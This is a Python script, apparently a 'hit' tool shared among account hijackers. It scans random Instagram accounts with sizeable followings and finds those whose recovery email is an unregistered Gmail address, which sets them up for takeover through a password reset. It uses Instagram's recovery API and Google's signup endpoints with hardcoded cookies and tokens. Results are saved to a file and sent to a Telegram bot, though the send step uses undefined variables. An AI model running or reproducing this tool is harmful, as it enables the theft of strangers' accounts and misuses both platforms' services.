
import hashlib
import importlib
import json
import os
import random
import re
import string
import subprocess
import sys
import time
import uuid
from datetime import datetime
from random import choice, randrange
from threading import Thread, Timer
import requests
from colorama import Fore, init, Style
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent
init()

init(autoreset=True)

Tobiconf = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ),
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "tl.txt",
    "Tobipy": "@gmail.com"
}


ig = '\033[38;5;202m'
ig1 = '\033[38;5;203m'
ig2 = '\033[38;5;204m'
ig3 = '\033[38;5;205m'
ig4 = '\033[38;5;206m'
ig5 = '\033[38;5;207m'
gr = '\x1b[38;5;48m'
W = '\033[38;5;15m'
C = '\033[38;5;39m'
n = '\033[38;5;203m'
GN = '\033[38;5;46m'
gry = '\033[38;5;248m'
yel = '\033[38;5;226m'
yel1 = '\033[38;5;227m'
yel2 = '\033[38;5;228m'
yel3 = '\033[38;5;229m'
yel4 = '\033[38;5;230m'
yel5 = '\033[38;5;231m'

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

session = requests.Session()

print('━' * 66)
logo = render('Tobi', font='block', colors=['white', 'black'], align='center', background='red' , space=True)
print(logo)
print('━' * 66)
print("  HIGH FOLLOWERS TOOL")
print('━' * 66)
time.sleep(1)

from colorama import Fore, Style, init
import re
from getpass import getpass

init(autoreset=True)

def valid_chat_id(cid):
    return cid.lstrip("-").isdigit()

def valid_token(token):
    return re.match(r"^\d+:[A-Za-z0-9_-]{30,}$", token)

# ───────── CHAT ID ─────────
while True:
    chat_id = input(f"{Fore.CYAN}📩 CHAT ID ▶ {Style.RESET_ALL}").strip()

    if not chat_id:
        print(f"{Fore.RED}❌ Chat ID blank or invalid\n")
        continue

    if not valid_chat_id(chat_id):
        print(f"{Fore.RED}❌ Invalid Chat ID format\n")
        continue

    print(f"{Fore.GREEN}✅ Chat ID valid ✔\n")
    break
while True:
    token = getpass(f"{Fore.CYAN}🤖 BOT TOKEN ▶ {Style.RESET_ALL}").strip()

    if not token:
        print(f"{Fore.RED}❌ Bot Token blank or invalid\n")
        continue

    if not valid_token(token):
        print(f"{Fore.RED}❌ Invalid Bot Token format\n")
        continue

    print(f"{Fore.GREEN}✅ Bot Token valid ✔\n")
    break

print(f"{Fore.GREEN}🚀 All credentials verified. Continuing...{Style.RESET_ALL}")
os.system('clear')
def pppp():
    Paras = hits
    Aotpy = bad_insta + bad_email
    Aot = good_ig

    stats_line = (
        f"{Fore.CYAN}[SYSTEM] >> "
        f"{Fore.GREEN}HITS={Paras} "
        f"{Fore.RED}BAD={Aotpy} "
        f"{Fore.GREEN}GOOD={Aot} "
        f"{Fore.YELLOW}::AOTPY{Style.RESET_ALL}"
    )
    print(f"\r{stats_line}", end="", flush=True)
    
def update_stats():
    pppp()
    
def Paras():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            Tobiconf["content_type_header"]: Tobiconf["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            Tobiconf["user_agent_header"]: str(generate_user_agent())
        }
        recovery_url = (f"{Tobiconf['google_accounts_url']}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        if match:
            tok = match.group(2)
        else:
            raise Exception("Token bulunamadı")
        cookies = {'__Host-GAPS': host}
        headers2 = {
            Tobiconf["authority_header"]: Tobiconf["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            Tobiconf["content_type_header"]: Tobiconf["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            Tobiconf["origin_header"]: Tobiconf["google_accounts_url"],
            Tobiconf["referrer_header"]: ('https://accounts.google.com/signup/v2/createaccount'
                                            '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            Tobiconf["user_agent_header"]: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{Tobiconf['google_accounts_url']}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)
        with open(Tobiconf["token_file"], 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print("Paras error in function:", e)
        Paras()


Paras()

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(Tobiconf["token_file"], 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            Tobiconf["authority_header"]: Tobiconf["google_accounts_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            Tobiconf["content_type_header"]: Tobiconf["content_type_form_alt"],
            'google-accounts-xsrf': '1',
            Tobiconf["origin_header"]: Tobiconf["google_accounts_url"],
            Tobiconf["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            Tobiconf["user_agent_header"]: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{Tobiconf['google_accounts_url']}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + Tobiconf["Tobipy"]
            InfoAcc(email, full_email.split('@')[1])
        else:
            bad_email += 1
            update_stats()
    except Exception as e:
        print("check_gmail error:", e)
        pass

def check(email):
    global good_ig, bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        Tobiconf["user_agent_header"]: ua,
        Tobiconf["cookie_header"]: Tobiconf["cookie_value"],
        Tobiconf["content_type_header"]: Tobiconf["content_type_form"]
    }
    data = {
        Tobiconf["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        Tobiconf["ig_sig_key_version"]: '4'
    }
    response = session.post(Tobiconf["instagram_recovery_url"], headers=headers, data=data).text
    if email in response:
        if Tobiconf["Tobipy"] in email:
            check_gmail(email)
        good_ig += 1
        update_stats()
    else:
        bad_insta += 1
        update_stats()

def rest(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                   'bb343b0862d663f31a3c63f13a9f31c0'),
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            Tobiconf["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                              '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                              'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            Tobiconf["cookie_header"]: Tobiconf["cookie_value"],
            Tobiconf["content_type_header"]: Tobiconf["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        data = {
            Tobiconf["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            Tobiconf["ig_sig_key_version"]: '4'
        }
        response = session.post(Tobiconf["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'no reset')
    except Exception as e:
        print("rest error in function:", e)
        return 'no reset'

def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk', 0)
    try:
        user_id_int = int(user_id)
    except:
        user_id_int = 0

    if 1 < user_id_int <= 1278889:
        reg_date = 2010
    elif 1279000 <= user_id_int <= 17750000:
        reg_date = 2011
    elif 17750001 <= user_id_int <= 279760000:
        reg_date = 2012
    elif 279760001 <= user_id_int <= 900990000:
        reg_date = 2013
    elif 900990001 <= user_id_int <= 1629010000:
        reg_date = 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        reg_date = 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        reg_date = 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        reg_date = 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        reg_date = 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        reg_date = 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        reg_date = 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        reg_date = 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        reg_date = 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        reg_date = 2023
    else:
        reg_date = "2024 or 2025"

    followers = account_info.get('follower_count', 0)
    try:
        followers = int(followers)
    except:
        followers = 0
    if followers < 30:
        return  

    following = account_info.get('following_count', '')
    total_hits += 1
    info_text = f"""
╔══════════════════════════════╗
║   ⚡ INSTA HIT by - @Aotpy ⚡   ║
╚══════════════════════════════╝

👤  USERNAME     ➜  @{username}
📧  EMAIL        ➜  {username}@gmail.com
♻️  RESET STATUS ➜  {rest(username)}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊  ACCOUNT STATS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👥  FOLLOWERS    ➜  {followers}
👣  FOLLOWING    ➜  {following}
🗓️  CREATED     ➜  {reg_date}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗  PROFILE URL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐  https://instagram.com/{username}

══════════════════════════════
✨ Powered by • @Aotpy / @Parasfr ✨
══════════════════════════════
"""
    print(info_text)

    with open('paid-high.txt', 'a') as f:
        f.write(info_text + "\n")
    
    try:
        keyboard = {
            'inline_keyboard': [
                [
                    {'text': 'Contact', 'url': 'https://t.me/foreshower'},
                    {'text': 'Channel', 'url': 'url'}
                ]
            ]
        }
        
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                    params={
                        'chat_id': ID,
                        'text': info_text,
                        'parse_mode': 'HTML',
                        'reply_markup': json.dumps(keyboard),
                        'disable_web_page_preview': True
                    })
    except Exception as e:
        print("Telegram message could not be sent:", e)

def Aotpy():
    while True:
        data = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'variables': json.dumps({
                'id': int(random.randrange(6345108210, 10016232395)),
                'render_surface': 'PROFILE'
            }),
            'doc_id': '25618261841150840'
        }
        headers = {'X-FB-LSD': data['lsd']}
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            account = response.json().get('data', {}).get('user', {})
            username = account.get('username')
            if username:
                followers = account.get('follower_count', 0)
                if followers < 35:  
                    continue
                infoinsta[username] = account
                email = username + Tobiconf["Tobipy"]
                check(email)
        except Exception as e:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(1) 

Thread(target=stats_loop, daemon=True).start()


for _ in range(80):
    Thread(target=Aotpy).start()